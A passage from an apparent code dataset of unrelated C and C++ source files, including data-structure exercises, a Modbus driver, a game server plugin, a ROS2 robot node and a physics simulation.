}\r\n}\r\n\r\nvoid Find_Keyword(int key)\r\n{\r\n int comp = 0;\r\n int level = 0;\r\n int done;\r\n struct HBTNode *current;\r\n\r\n done = 0;\r\n current = Root;\r\n while(!done)\r\n {\r\n if(key < current->Key)\r\n {\r\n current = current->left;\r\n level++;\r\n comp++;\r\n }\r\n else if(key > current->Key)\r\n {\r\n current = current->right;\r\n level++;\r\n comp++;\r\n }\r\n else\r\n {\r\n done = 1;\r\n comp++;\r\n cout<<\"\\n\\t Key : \"<<key;\r\n cout<<\"\\n\\t Found at Level: \"<<level;\r\n cout<<\"\\n\\t No. of Comparisons: \"<<comp;\r\n }\r\n\r\n }\r\n\r\n\r\n}\r\n\r\nint main()\r\n{\r\n cout<<\"\\n -------***A C++ Program to Implement Dictionary using Height-Balanced\r\nTree.***-------\\n\";\r\n\r\n cout<<\"\\n 1. Store Keywords and Meanings in Height-Balanced Tree.\";\r\n Root = NULL;\r\n create_HBT();\r\n\r\n cout<<\"\\n 2. Display Keywords and Meanings in Height-Balanced Tree.\";\r\n cout<<\"\\n Keyword - Meaning\";\r\n display_HBT(Root);\r\n\r\n cout<<\"\\n 3. Display a Sorted List of Keywords and Meanings.\";\r\n cout<<\"\\n Keyword - Meaning\";\r\n Sorted_List(Root);\r\n\r\n cout<<\"\\n 4. Display Number of Comparisons required to find a keyword.\";\r\n Find_Keyword(1);\r\n return 0;\r\n}\r\n/*------------------------------OUTPUT-----------------------------------\r\n-------***A C++ Program to Implement Dictionary using Height-Balanced Tree.***-------\r\n 1. Store Keywords and Meanings in Height-Balanced Tree.\r\n Enter the no of nodes to insert in HBT.? : 5\r\n Enter Keyword: 3\r\n Enter Meaning: Three\r\n Enter Keyword: 2\r\n Enter Meaning: Two\r\n Enter Keyword: 4\r\n Enter Meaning: Four\r\n Enter Keyword: 1\r\n Enter Meaning: One\r\n Enter Keyword: 5\r\n Enter Meaning: Five\r\n 2. Display Keywords and Meanings in Height-Balanced Tree.\r\n Keyword - Meaning\r\n 3 - Three\r\n 2 - Two\r\n 1 - One\r\n 4 - Four\r\n 5 - Five\r\n 3. Display a Sorted List of Keywords and Meanings.\r\n Keyword - Meaning\r\n 1 - One\r\n 2 - Two\r\n 3 - Three\r\n 4 - Four\r\n 5 - Five\r\n 4. Display Number of Comparisons required to find a keyword.\r\n Key : 1\r\n Found at Level: 2\r\n No. of Comparisons: 3\r\n...Program finished with exit code 0\r\nPress ENTER to exit console.\r\n*/\r\n",
    "/**\n * @file\t\tred_black_tree.cpp\n * @brief\t\tRed-Black Tree\n * @author\t\tJeong Hoon (Sian) Choi\n * @version\t\t1.0.0\n * @date\t\t2024-06-05\n */\n\n#include \"sian/red_black_tree.h\"\n\n/* C & CPP */\n/*\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n*/\n\n#if _TARGET_OS == OS_WINDOWS\n\n#elif _TARGET_OS == OS_LINUX\n\n/* Definition */\n\n/* ASM codes */\n/*\nasm(R\"ASM(\n  ; assembly code x86-64 AT&T(fastcall-cdecl)\nfunc:\n  .cfi_startproc\n        pushq %rbp\n        .cfi_def_cfa_offset 16\n        .cfi_offset 6, -16\n        movq %rsp, %rbp\n        .cfi_def_cfa_register 6\n        movl %edi, -4(%rbp)  ; %rdi -> %rsi -> %rdx -> %rcx ->\n        movl %esi, -8(%rbp)  ; %r8  -> %r9  -> stack\n; return value %eax\n        popq %rbp\n\t\t\t\t.cf_def_cfa 7, 8\n\t\t\t\tret\n\t\t\t\t.cfi_endproc\n)ASM\");\n*/\n\n/* Data structures definition - struct & class */\n\n/*\n\nSample::Sample(const Sample& src) {\n\t// Deep Copy\n}\n\nSample& Sample::operator=(const Sample& src) {\n\tif(this == &src) {\n\t\treturn *this;\n\t}\n\t\n\tSample temp(src);\n\tswap(*this, temp);\n\treturn *this;\n}\n\nSample::Sample(Sample&& src) noexcept : Sample() {\n\tswap(*this, src);\n}\n\nSample& Sample::operator=(Sample&& src) noexcept {\n\tSample temp(std::move(src));\n\tswap(*this, temp);\n\treturn *this;\n}\n\n*/\n\n/* Functions definition */\n\n/*\n\nvoid swap(Sample& lhs, Sample& rhs) noexcept {\n\t// shallow copy\n    // using std::swap;\n}\n\n*/\n\n#endif // OS dependency\n\n/*\n#ifdef __cplusplus\n}\n#endif\n*/\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"stateful_widget\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <cstdlib>\n#include<ctime>\nusing namespace std;\n\n\n\nint const QueueSize = 100;\nint const stackSize = 100;\nint \u00ddtems[QueueSize];\nint Stack[stackSize];\nint front, rear;\nint Top = -1;\nint generateNumber()\n{\n\tstatic bool first = true;\n\tif (first)\n\t{\n\t\tsrand(time(NULL));\n\t\tfirst = false;\n\t}\n\treturn 0 + rand() % (1001);\n}\nvoid \u00ddnsertNumber()\n{\n\tint x = 0;\n\tif (rear == QueueSize - 1)\n\t\trear = 0;\n\n\telse\n\t\trear++;\n\n\tif (rear == front)\n\t{\n\t\tcout << \"Queue overflow\" << endl;\n\t\texit(1);\n\t}\n\t\u00ddtems[rear] = x;\n\n}\n\nint DeleteNumber()\n{\n\tif (front == rear)\n\t{\n\t\tcout << \"Queue underflow\" << endl;\n\t\texit(1);\n\t}\n\telse if (front == QueueSize - 1)\n\t\tfront = 0;\n\telse\n\t\tfront++;\n\treturn \u00ddtems[front];\n}\nvoid Push(int a)\n{\n\tif (Top >= stackSize - 1)\n\n\t\tcout << \"Stack is full..\" << endl;\n\telse\n\t{\n\t\tTop++;\n\t\tStack[Top] = a;\n\n\t}\n}\nvoid Pop(int b)\n{\n\tif (Top <= -1)\n\t{\n\t\tcout << \"Stack is empty...\" << endl;\n\t}\n\telse {\n\t\tcout << \"Value :\" << Stack[Top] << \"GOT deleted.\" << endl;\n\t\tTop--;\n\t}\n}\n\nvoid PrintQueue(int arr[])\n{\n\n\n\tcout << \"Element in the Queue are: \" << endl;\n\tfor (int i = 0; i < QueueSize; i++)\n\t{\n\t\tcout << \u00ddtems[i] << endl;\n\n\t}\n}\nvoid PrintStack(int arr[])\n{\n\n\n\tcout << \"Element in the stack are: \" << endl;\n\tfor (int i = 0; i < stackSize; i++)\n\t{\n\t\tcout << Stack[i] << endl;\n\n\t}\n}\n\nint main()\n{\n\t\n\tcout << \"Element in the Queue are: \" << endl;\n\tfor (int i = 0; i < 100; i++)\n\t{\n\t\t\u00ddtems[i] = generateNumber();\n\t}\n\t\u00ddnsertNumber();\n\t//DeleteNumber();\n\tPrintQueue(\u00ddtems);\n\n\t\n\tfor (int i = 0; i < 100; i++)\n\t{\n\t   Stack[i]= \u00ddtems[i];\n\t}\n\n\t/*Push(10);\n\tPop(5);*/\n\tPrintStack(Stack);\n\t\n\n\n\n\n\n\treturn 0;\n}",
    "//Copyright (c) 2024 Dominik M. Glogowski\n//\n//Permission is hereby granted, free of charge, to any person obtaining a copy\n//of this software and associated documentation files (the \"Software\"), to deal\n//in the Software without restriction, including without limitation the rights\n//to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n//copies of the Software, and to permit persons to whom the Software is\n//furnished to do so, subject to the following conditions:\n//\n//The above copyright notice and this permission notice shall be included in all\n//copies or substantial portions of the Software.\n//\n//THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n//SOFTWARE.\n\n#include \"DynamicModbusMaster.h\"\n#include \"dmm_common.h\"\n#include <esp_modbus_master.h>\n#include <esp_modbus_common.h>\n\nnamespace dynamic_modbus_master {\n\nconsteval mb_communication_info_t defaultCommInfo() {\n    return {\n            .mode = MB_MODE_RTU,\n            .slave_addr = 0,\n            .parity = UART_PARITY_DISABLE,\n            .dummy_port = 0\n    };\n}\n\nModbusError DynamicModbusMaster::initialise(ModbusConfig config) {\n    m_config = config;\n    esp_err_t error = mbc_master_init(MB_PORT_SERIAL_MASTER, &m_handle);\n    if (error != ESP_OK) {\n        ESP_LOGE(TAG, \"An error occured while trying to initialise the port %s\", esp_err_to_name(error));\n        if (error == ESP_ERR_NOT_SUPPORTED) {\n            return ModbusError::PORT_NOT_SUPPORTED;\n        } else if (error == ESP_ERR_INVALID_STATE) {\n            return ModbusError::INVALID_STATE;\n        } else {\n            return ModbusError::FAILURE_OR_EXCEPTION;\n        }\n    }\n    \n    mb_communication_info_t commInfo = defaultCommInfo();\n    \n    commInfo.port = m_config.uartPort;\n    commInfo.baudrate = m_config.baudRate;\n    commInfo.mode = m_config.modbusMode;\n    \n    error = mbc_master_setup(&commInfo);\n    if (error != ESP_OK) {\n        ESP_LOGE(TAG, \"An error occurred while trying to set up the communication parameters: %s\",\n                 esp_err_to_name(error));\n        return ModbusError::INVALID_ARG;\n    }\n    \n    error = uart_set_pin(m_config.uartPort, m_config.txdPin, m_config.rxdPin, m_config.rtsPin, UART_PIN_NO_CHANGE);\n    if (error != ESP_OK) {\n        ESP_LOGE(TAG, \"An error occurred while setting the UART pins: %s\", esp_err_to_name(error));\n        return ModbusError::FAILURE_OR_EXCEPTION;\n    }\n    \n    return ModbusError::OK;\n}\n\nModbusError DynamicModbusMaster::start() {\n    esp_err_t error = mbc_master_start();\n    if (error != ESP_OK) {\n        ESP_LOGE(TAG, \"An error occurred while starting the Modbus communication stack: %s\", esp_err_to_name(error));\n        return ModbusError::INVALID_ARG;\n    }\n    \n    error = uart_set_mode(m_config.uartPort, UART_MODE_RS485_HALF_DUPLEX);\n    if (error != ESP_OK) {\n        ESP_LOGE(TAG, \"An error occured while setting the UART mode %s\", esp_err_to_name(error));\n        return ModbusError::INVALID_ARG;\n    }\n    \n    return ModbusError::OK;\n}\n\nModbusError DynamicModbusMaster::stop() {\n    esp_err_t error = mbc_master_destroy();\n    if (error != ESP_OK) {\n        ESP_LOGE(TAG, \"An error occured while trying to stop and destroy the modbus communication stack %s\",\n                 esp_err_to_name(error));\n        return ModbusError::INVALID_STATE;\n    }\n    return ModbusError::OK;\n}\n}\n",
    "\ufeff#include \"plugin.h\"\n#include \"main.h\"\n\nCServerPlugin g_EmtpyServerPlugin;\nEXPOSE_SINGLE_INTERFACE_GLOBALVAR(CServerPlugin, IServerPluginCallbacks, INTERFACEVERSION_ISERVERPLUGINCALLBACKS, g_EmtpyServerPlugin);\n\n//---------------------------------------------------------------------------------\n// Purpose: constructor/destructor\n//---------------------------------------------------------------------------------\nCServerPlugin::CServerPlugin()\n{\n\tm_iClientCommandIndex = 0;\n}\n\nCServerPlugin::~CServerPlugin()\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when the plugin is loaded, load the interface we need from the engine\n//---------------------------------------------------------------------------------\nbool CServerPlugin::Load(CreateInterfaceFn interfaceFactory, CreateInterfaceFn gameServerFactory)\n{\n\tVProfLoad();\n\n\treturn true;\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when the plugin is unloaded (turned off)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::Unload(void)\n{\n\tVProfUnload();\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when the plugin is paused (i.e should stop running but isn't unloaded)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::Pause(void)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when the plugin is unpaused (i.e should start executing again)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::UnPause(void)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: the name of this plugin, returned in \"plugin_print\" command\n//---------------------------------------------------------------------------------\nconst char * CServerPlugin::GetPluginDescription(void)\n{\n\treturn \"VProf v0.1\";\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level start\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::LevelInit(char const *pMapName)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level start, when the server is ready to accept client connections\n//\t\tedictCount is the number of entities in the level, clientMax is the max client count\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ServerActivate(edict_t *pEdictList, int edictCount, int clientMax)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called once per server frame, do recurring work here (like checking for timeouts)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::GameFrame(bool simulating)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level end (as the server is shutting down or going to a new map)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::LevelShutdown(void) // !!!!this can get called multiple times per map change\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when a client spawns into a server (i.e as they begin to play)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ClientActive(edict_t *pEntity)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when a client leaves a server (or is timed out)\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ClientDisconnect(edict_t *pEntity)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called when a client spawns?\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ClientPutInServer(edict_t *pEntity, char const *playername)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level start\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::SetCommandClient(int index)\n{\n\tm_iClientCommandIndex = index;\n}\n\n//---------------------------------------------------------------------------------\n// Purpose: called on level start\n//---------------------------------------------------------------------------------\nvoid CServerPlugin::ClientSettingsChanged(edict_t *pEdict)\n{\n}\n\n//---------------------------------------------------------------------------------\n// Purp",
    "\ufeff#include<iostream>\n#include\"omp.h\"\n#include<thread>\n\nusing namespace std;\n\nconst int rows = 5000;\nconst int cols = 5000;\n\nconst int Treadds = 10;\n\nint MyArr[rows][cols];\n\nvoid init_arr();\n\nint FindMin();\n\nint FindSum();\nint FindSum(int);\n\nint main() {\n\n\tinit_arr();\n\n\tomp_set_nested(1);\n\tdouble t1 = omp_get_wtime();\n#pragma omp parallel sections\n\t{\n#pragma omp section\n\t\t{\n\t\t\tint d = FindSum();\n\t\t\tdouble t2 = omp_get_wtime();\n\n#pragma omp critical\n\t\t\t{\n\t\t\t\tstd::cout << d << endl;\n\t\t\t\tcout << t2 - t1 << endl;\n\t\t\t}\n\t\t}\n\n#pragma omp section\n\t\t{\n\t\t\tint d = FindMin();\n\t\t\tint dd = FindSum(d);\n\t\t\tdouble t2 = omp_get_wtime();\n#pragma omp critical\n\t\t\t{\n\t\t\t\tcout << dd << endl;\n\t\t\t\tcout << d << endl;\n\t\t\t\tcout << t2 - t1 << endl;\n\t\t\t}\n\t\t}\n\t}\n\treturn 2;\n}\n\nint FindSum()\n{\n\tint sum = 0;\n#pragma omp parallel for reduction(+:sum) num_threads(Treadds)\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tfor (int j = 0; j < cols; j++)\n\t\t{\n\t\t\tsum = sum + MyArr[i][j];\n\t\t}\n\t\t//std::this_thread::sleep_for(std::chrono::milliseconds(1));\n\t}\n\treturn sum;\n}\n\nint FindSum(int row)\n{\n\tint sum = 0;\n\tfor (int j = 0; j < cols; j++)\n\t{\n\t\tsum = sum + MyArr[row][j];\n\t}\n\n\nreturn sum;\n}\n\nint FindMin()\n{\n\tint IndexOfMin = rows - 1;\n#pragma omp parallel for num_threads(Treadds)\n\tfor (int i = 0; i < rows; i++)\n\t{\n\t\tint t1 = FindSum(i);\n\t\t{\n\t\t\tif (t1 < FindSum(IndexOfMin))\n\t\t\t{\n#pragma omp critical\n\t\t\t\t{\n\t\t\t\t\tif (t1 < FindSum(IndexOfMin))\n\t\t\t\t\t{\n\n\t\t\t\t\t\tIndexOfMin = i;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t//std::this_thread::sleep_for(std::chrono::milliseconds(1));\n\t}\n\treturn IndexOfMin;\n}\n\n\nvoid init_arr() {\n\tfor (int j = 0; j < rows; j++)\n\t{\n\t\tfor (int i = 0; i < cols; i++) {\n\t\t\t//MyArr[j][i] = (i+1)*(j+1);\n\t\t\tMyArr[j][i] = rand()%100;\n\t\t}\n\t}\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nstruct ListNode {\n    int val;\n    ListNode *next;\n    ListNode() : val(0), next(nullptr) {\n    }\n    ListNode(int x) : val(x), next(nullptr) {\n    }\n    ListNode(int x, ListNode *next) : val(x), next(next) {\n    }\n};\n\nstruct TreeNode {\n    int val;\n    TreeNode *left;\n    TreeNode *right;\n    TreeNode() : val(0), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x) : val(x), left(nullptr), right(nullptr) {\n    }\n    TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {\n    }\n};\n\nclass Node {\npublic:\n    int val;\n    vector<Node *> neighbors;\n    Node() {\n        val = 0;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val) {\n        val = _val;\n        neighbors = vector<Node *>();\n    }\n    Node(int _val, vector<Node *> _neighbors) {\n        val = _val;\n        neighbors = _neighbors;\n    }\n};\n\n/*the solution should start from below*/\n\nclass Solution {\npublic:\n    bool isPossibleToSplit(vector<int> &nums) {\n        unordered_map<int, int> cnt;\n        for (const auto &i : nums) {\n            cnt[i]++;\n            if (cnt[i] > 2) return false;\n        }\n        return true;\n    }\n};",
    "#include <iostream>\n#include <boost/thread.hpp>\n#include <boost/asio/io_context.hpp>\n#include <boost/bind.hpp>\n#include \"globals.h\"\n#include \"ArchiveServer.h\"\n\n\n/*!\n * \u0413\u043b\u0430\u0432\u043d\u0430\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u044f,\n * \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 \u0430\u0440\u0433\u0443\u043c\u0435\u043d\u0442\u044b \u0442\u0435\u0440\u043c\u0438\u043d\u0430\u043b\u0430, \u043d\u0430\u0441\u0442\u0440\u0430\u0438\u0432\u0430\u0435\u0442 \u043f\u0443\u043b \u043f\u043e\u0442\u043e\u043a\u043e\u0432 \u0438 \u0432\u043a\u043b\u044e\u0447\u0430\u0435\u0442 \u0441\u0435\u0440\u0432\u0435\u0440!\n * @param argc\n * @param argv\n * @return\n */\nint main(int argc, char *argv[])\n{\n    setlocale(LC_ALL, \"Russian\");\n    if (!parse_args(argc, argv)) {\n        std::cout << \"set all options\" << std::endl;\n        return 0;\n    };\n\n    try {\n        boost::asio::io_context ioContext;\n        boost::asio::executor_work_guard<decltype(ioContext.get_executor())> work { ioContext.get_executor() };\n        boost::thread_group threadPool;\n        for (int i = 0; i < threadsNum; i++) {\n            threadPool.create_thread(\n                    boost::bind(&boost::asio::io_context::run, &ioContext)\n            );\n        }\n\n        ArchiveServer server(ioContext, ip, port, dirClient);\n\n        threadPool.join_all();\n    } catch (std::exception& e) {\n        std::cerr << \"Exception: \" << e.what() << \"\\n\";\n    }\n\n    return 0;\n}",
    "/*  \n*   A basic node for ros2 that runs with ariaCoda\n*   To run use 'ros2 run ariaNode ariaNode -rp /dev/ttyUSB0'\n*\n*   Author: Kieran Quirke-Brown\n*   Date: 12/01/2024\n*/\n\n#include <chrono>\n#include <functional>\n#include <memory>\n#include <string>\n#include <signal.h>\n\n#include <rclcpp/rclcpp.hpp>\n#include <geometry_msgs/msg/twist.hpp>\n\n# include \"Aria/Aria.h\"\n\n//used with signal handler as signal handler function doesn't accept parameters\nbool stopRunning = false;\n\nusing namespace std::chrono_literals;\n/*\n*   Basic ROS node that updates velocity of pioneer robot, Aria doesn't like\n*   being spun as a node therefore we just use a single subscriber\n*   parameters:\n*       forward and ratation speeds are float that are bound to the node\n*       but point at the same location as the aria velocities\n*/\nclass ariaNode : public rclcpp::Node {\n    public:\n        ariaNode(float* forwardSpeed, float* rotationSpeed) : Node(\"Aria_node\") {\n            currentForwardSpeed = forwardSpeed;\n            currentRotationSpeed = rotationSpeed;\n\n            cmdVelSub = create_subscription<geometry_msgs::msg::Twist> (\n                \"cmd_vel\", 10, std::bind(&ariaNode::cmdVelCallback, this, std::placeholders::_1)\n            );    \n        }\n\n    private:\n        void cmdVelCallback(const geometry_msgs::msg::Twist::SharedPtr msg) {\n            \n            double linearSpeed = msg->linear.x;\n            double angularSpeed = msg->angular.z;\n\n            *currentForwardSpeed = linearSpeed;\n            *currentRotationSpeed = angularSpeed;\n\n            RCLCPP_DEBUG(this->get_logger(), \"message received.\");\n\n        }\n\n        rclcpp::Subscription<geometry_msgs::msg::Twist>::SharedPtr cmdVelSub;\n        float* currentForwardSpeed;\n        float* currentRotationSpeed;\n    \n};\n\n// Deals with ctl+c handling to stop the motors correctly.\nvoid my_handler(int s){\n           printf(\"Caught signal %d\\n\",s);\n           stopRunning = true;\n}\n\nint main(int argc, char** argv) {\n    rclcpp::init(argc, argv);\n\n    Aria::init();\n    ArArgumentParser parser(&argc, argv);\n    parser.loadDefaultArguments();\n    ArRobot* robot;\n    robot = new ArRobot();\n\n    signal(SIGINT, my_handler);\n    \n    // RCLCPP_DEBUG(this->get_logger(),\"Trying to connect to robot...\");\n    ArRobotConnector robotConnector(&parser, robot);\n    if(!robotConnector.connectRobot()) {\n        ArLog::log(ArLog::Terse, \"simpleConnect: Could not connect to the robot.\");\n        if(parser.checkHelpAndWarnUnparsed()) {\n            Aria::logOptions();\n            Aria::exit(1);\n        }\n    }\n\n    robot->setAbsoluteMaxTransVel(400);\n\n    float forwardSpeed = 0.0;\n    float rotationSpeed = 0.0;\n    \n    \n    // RCLCPP_DEBUG(aNode->get_logger(),\"Run Async\");\n    robot->runAsync(true);\n    // RCLCPP_DEBUG(aNode->get_logger(),\"Enable Motors\");\n    robot->enableMotors();\n\n    auto aNode = std::make_shared<ariaNode>(&forwardSpeed, &rotationSpeed);\n    RCLCPP_DEBUG(aNode->get_logger(),\"Before Spin!...\");\n\n    /*\n     *   Aria does not like to run in a ros node therefore we run a while loop\n     *   that continuously spins the node to update velocities which are \n     *   then sent using the normal Aria commands.\n    */\n    while (!stopRunning) {\n        rclcpp::spin_some(aNode);\n        // RCLCPP_DEBUG(aNode->get_logger(), \"sending motor command.\");\n            robot->lock();\n            robot->setVel(forwardSpeed * 500);\n            robot->setRotVel(rotationSpeed * 50);\n            robot->unlock();\n            // RCLCPP_DEBUG(aNode->get_logger(), \"motor command sent.\");\n            // RCLCPP_DEBUG(aNode->get_logger(), \"forward speed is now %f.\", forwardSpeed);\n            // RCLCPP_DEBUG(aNode->get_logger(), \"rotational speed is now %f.\", rotationSpeed);\n    }\n    RCLCPP_DEBUG(aNode->get_logger(), \"After Spin\");\n\n    robot->disableMotors();\n    robot->stopRunning();\n    // wait for the thread to stop\n    robot->waitForRunExit();\n\n    // exit\n    RCLCPP_DEBUG(aNode->get_logger(), \"ending Aria node\");\n    Aria::exit(0);\n    return 0;\n}\n",
    "#include<stdio.h>\r\n#include<string.h>\t\r\ntypedef struct String\r\n{\r\n\tchar st[300];\r\n\tint length;\r\n}String,*Str;\r\nvoid Bulid(Str &s)\r\n{\r\n\tint i,j,k;\r\n\tchar x[300];\r\n\tscanf(\"%s\",&x);\r\n\tj = strlen(x);\r\n\ti = 0;\r\n\ts->length = 0;\r\n\twhile(j)\r\n\t{ \r\n\t\ts->st[i] = x[i];\r\n\t\ts->length++; \r\n\t\ti++;\r\n\t\tj--;\r\n\t}\r\n}\r\nvoid Output(Str &s)\r\n{\r\n\tint i = 0;\r\n\tprintf(\"\u8f93\u5165\u5b8c\u6210\u8bf7\u68c0\u67e5...\\n\");\r\n\tprintf(\"\u4e32\u7684\u5185\u5bb9\uff1a\");\r\n\tfor(i; i<=s->length; i++)\r\n\t\tprintf(\"%c\",s->st[i]); \r\n\tprintf(\"\\n\");\r\n}\r\nint Index_BF(Str &s,Str &t)\r\n{\r\n\tint i,j;\r\n\ti = 1;\r\n\tj = 1;\r\n\twhile(i<=s->length && j<=t->length)\r\n\t{\r\n\t\tif(s->st[i]==t->st[j])\r\n\t\t{\r\n\t\t\t++i;\r\n\t\t\t++j;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\ti = i-j+2;\r\n\t\t\tj = 1;\r\n\t\t}\r\n\t}\r\n\tif(j>t->length)\r\n\treturn i-t->length;\r\n\telse return 0;\r\n } \r\n int main()\r\n {\r\n\tStr s,t;\r\n\tint i,j,pos;\r\n\ts = new String; \r\n\tt = new String; \r\n\tprintf(\"\u5373\u5c06\u4f7f\u7528BF\u7b97\u6cd5\u8fdb\u884c\u6a21\u5f0f\u5339\u914d\\n\");\r\n\tprintf(\"\u8bf7\u8f93\u5165\u4e3b\u4e32\uff1a\");\r\n\tBulid(s);\r\n\tOutput(s);\r\n\tprintf(\"\\n\");\r\n\tprintf(\"\u8bf7\u8f93\u5165\u6a21\u5f0f\u4e32\uff1a\");\r\n\tBulid(t);\r\n\tOutput(t);\r\n\tpos = Index_BF(s,t);\r\n\tprintf(\"\\n\");\r\n\tprintf(\"\u5339\u914d\u5730\u5740\u4e3a%d\\n\",pos);\r\n \treturn 0;\r\n }\r\n",
    "#include <stdio.h>\n#include <vector>\n#include <valarray>\n#include <thread>\n#include <numeric>\n#include <SFML/Graphics.hpp>\n#include <SFML/Window/Mouse.hpp>\n#include \"SUI.h\"\n#include \"Ball.h\"\n#include \"QuadTree.h\"\n\n\nbool checkBoundsCollisionX(float posX, sf::RectangleShape& panel, float r)\n{\n\tif (posX < panel.getPosition().x || posX > panel.getPosition().x + panel.getLocalBounds().width - r)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nbool checkBoundsCollisionY(float posY, sf::RectangleShape& panel, float r)\n{\n\tif (posY < panel.getPosition().y || posY > panel.getPosition().y + panel.getLocalBounds().height - r)\n\t{\n\t\treturn true;\n\t}\n\treturn false;\n}\n\nfloat calcDist(Ball& b1, Ball& b2)\n{\n\treturn sqrt(pow((b2.getPosition().x - b1.getPosition().x), 2) + pow((b2.getPosition().y - b1.getPosition().y), 2));\n}\n\nvoid calcPos(Ball& b, sf::RectangleShape& panel, float dT)\n{\n\tfloat yForce = (b.getMass() * 9.8);\n\tfloat xVel = b.velocity.x;\n\tfloat yVel = b.velocity.y + (yForce * dT);\n\tb.velocity = sf::Vector2f(xVel, yVel);\n\t//printf(\"Ball velocity: (%f , %f)\\n\", xVel, yVel);\n\t\n\t\n\tsf::Vector2f nPos = sf::Vector2f((b.getPosition().x + b.velocity.x), (b.getPosition().y + b.velocity.y));\n\tif (checkBoundsCollisionX(nPos.x, panel, b.getRadius()))\n\t{\n\t\tfloat minBound = panel.getPosition().x;\n\t\tfloat maxBound = (panel.getPosition().x + panel.getLocalBounds().width);\n\t\tfloat newX = (nPos.x < minBound) ? minBound + b.getRadius() : maxBound - b.getRadius();\n\t\tnPos.x = newX;\n\t\tb.velocity.x *= -1;\n\t}\n\tif (checkBoundsCollisionY(nPos.y, panel, b.getRadius()))\n\t{\n\t\t\n\t\tfloat minBound = panel.getPosition().y;\n\t\tfloat maxBound = (panel.getPosition().y + panel.getLocalBounds().height);\n\t\tfloat newY = (nPos.y < minBound) ? minBound + b.getRadius() : maxBound - b.getRadius();\n\t\tnPos.y = newY; \n\t\tb.velocity.y *= -1;\n\t}\n\n\t//printf(\"new Pos: (%f,%f) \\n\", nPos.x, nPos.y);\n\tb.setPosition(nPos);\n}\n\nvoid calcCol(Ball& b1, Ball& b2)\n{\n\tfloat b1Mass = b1.getMass();\n\tfloat b2Mass = b2.getMass();\n\tstd::valarray<float> b1Vel = { b1.velocity.x, b1.velocity.y };\n\tstd::valarray<float> b2Vel = { b2.velocity.x, b2.velocity.y };\n\tstd::valarray<float>b1Pos = { b1.getPosition().x, b1.getPosition().y };\n\tstd::valarray<float>b2Pos = { b2.getPosition().x, b2.getPosition().y };\n\n\tauto elasticColVel = [](std::valarray<float> v1, std::valarray<float> v2, float m1, float m2, std::valarray<float> c1,\n\t\tstd::valarray<float> c2) -> std::valarray<float>\n\t{\n\t\tauto dot = [](std::valarray<float> a, std::valarray<float> b) -> float\n\t\t{\n\t\t\treturn (a[0] * b[0]) + (a[1] * b[1]);\n\t\t};\n\n\t\tauto vectorNorm = 